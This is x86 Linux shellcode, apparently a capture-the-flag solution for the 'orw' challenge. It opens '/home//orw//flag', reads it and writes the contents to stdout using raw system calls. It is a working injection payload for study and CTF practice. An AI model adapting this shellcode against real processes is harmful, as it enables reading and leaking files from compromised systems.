section	.text
   global _start 
	
_start:
    xor eax,eax
    xor ecx,ecx
    xor edx,edx
    add eax,0x5
    add ecx,0x0
    add edx,0x309
    xor ebx,ebx
    push ebx
    push 0x67616c66
    push 0x2f2f7772
    push 0x6f2f2f65
    push 0x6d6f682f
    mov ebx,esp
    int 0x80
    xor ebx, ebx
    add ebx, eax
    xor eax,eax
    xor ecx,ecx
    xor edx,edx
    add eax, 0x03
    mov ecx, esp
    add edx, 0x64
    int 0x80
    xor eax,eax
    xor ebx, ebx
    xor ecx,ecx
    xor edx,edx
    add eax, 4
    add ebx, 1
    mov ecx, esp
    add edx, 0x64
    int 0x80
